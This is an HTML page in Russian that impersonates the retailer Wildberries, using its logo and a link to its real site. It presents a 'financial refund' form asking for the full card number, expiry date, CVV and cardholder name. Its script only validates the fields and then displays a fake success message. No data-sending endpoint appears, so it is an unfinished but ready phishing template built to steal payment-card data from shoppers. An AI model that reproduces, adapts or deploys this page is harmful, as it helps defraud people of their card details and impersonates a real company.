<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Финансовый возврат</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
    }

    header {
      width: 100%;
      background: #9b4dca;
      position: sticky;
      top: 0;
      z-index: 10;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      text-align: center;
    }
    header .logo-link {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      color: white;
      text-decoration: none;
      font-size: 26px;
      font-weight: bold;
      padding: 18px;
      cursor: pointer;
    }
    header .logo-link img {
      height: 32px;
      width: 32px;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #a000c8;
      font-size: 28px;
      margin-bottom: 8px;
    }
    .subtitle {
      text-align: center;
      font-size: 15px;
      color: #555;
      margin: 0 0 20px 0;
      line-height: 1.5;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
      box-sizing: border-box;
    }

    .row {
      display: flex;
      gap: 10px;
      width: 100%;
    }
    .row input {
      flex: 1 1 0;
    }

    button {
      background: #a000c8;
      color: white;
      font-size: 18px;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #8a00a8;
    }

    .error {
      color: red;
      font-size: 13px;
      display: none;
      margin-top: -5px;
      margin-bottom: 5px;
    }
    .success {
      color: green;
      font-size: 14px;
      text-align: center;
      display: none;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <header>
    <a href="https://www.wildberries.ru/" target="_blank" class="logo-link">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Wildberries_logo.svg/512px-Wildberries_logo.svg.png" alt="logo">
      <span>WILDBERRIES</span>
    </a>
  </header>

  <div class="container">
    <h2>Финансовый возврат</h2>
    <p class="subtitle">Для получения возврата денежных средств введите данные карты</p>
    <form id="refundForm">
      <input type="tel" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
      <div id="cardError" class="error">Введите полный номер карты (16 цифр)</div>

      <div class="row">
        <input type="tel" id="expiry" placeholder="MM / YY" maxlength="7" inputmode="numeric" required>
        <input type="tel" id="cvv" placeholder="CVV" maxlength="3" inputmode="numeric" required>
      </div>
      <div id="expiryError" class="error">Введите срок действия (MM/YY)</div>
      <div id="cvvError" class="error">Введите CVV (3 цифры)</div>

      <input type="text" id="cardholder" placeholder="Имя владельца" required>

      <button type="submit">Отправить запрос</button>
    </form>
    <div id="successMessage" class="success">Запрос успешно отправлен!</div>
  </div>

  <script>
    const cardInput = document.getElementById('orderNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const form = document.getElementById('refundForm');
    const cardError = document.getElementById('cardError');
    const expiryError = document.getElementById('expiryError');
    const cvvError = document.getElementById('cvvError');
    const successMessage = document.getElementById('successMessage');

    // Маска для номера карты
    cardInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.slice(0,16);
      const parts = value.match(/.{1,4}/g);
      e.target.value = parts ? parts.join(' ') : '';
      if (value.length === 16) cardError.style.display = 'none';
    });

    // Маска для MM / YY
    expiryInput.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0,4);
      if (value.length > 2) {
        e.target.value = value.slice(0,2) + " / " + value.slice(2);
      } else {
        e.target.value = value;
      }
      if (value.length === 4) expiryError.style.display = 'none';
    });

    // Маска для CVV
    cvvInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
      if (e.target.value.length === 3) cvvError.style.display = 'none';
    });

    // Проверка формы
    form.addEventListener('submit', (e) => {
      e.preventDefault();

      let valid = true;
      successMessage.style.display = 'none';

      // Проверка карты
      const cardValue = cardInput.value.replace(/\s/g, '');
      if (cardValue.length !== 16) {
        cardError.style.display = 'block';
        valid = false;
      } else {
        cardError.style.display = 'none';
      }

      // Проверка срока действия
      const expiryValue = expiryInput.value.replace(/\D/g, '');
      if (expiryValue.length !== 4) {
        expiryError.textContent = "Введите срок действия (MM/YY)";
        expiryError.style.display = 'block';
        valid = false;
      } else {
        const month = parseInt(expiryValue.slice(0,2), 10);
        const year = parseInt("20" + expiryValue.slice(2), 10);

        const now = new Date();
        const currentMonth = now.getMonth() + 1;
        const currentYear = now.getFullYear();

        if (month < 1 || month > 12) {
          expiryError.textContent = "Месяц должен быть от 01 до 12";
          expiryError.style.display = 'block';
          valid = false;
        } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
          expiryError.textContent = "Срок действия карты истёк";
          expiryError.style.display = 'block';
          valid = false;
        } else {
          expiryError.style.display = 'none';
        }
      }

      // Проверка CVV
      const cvvValue = cvvInput.value;
      if (cvvValue.length !== 3) {
        cvvError.style.display = 'block';
        valid = false;
      } else {
        cvvError.style.display = 'none';
      }

      if (!valid) return;

      successMessage.style.display = 'block';
    });
  </script>
</body>
</html>
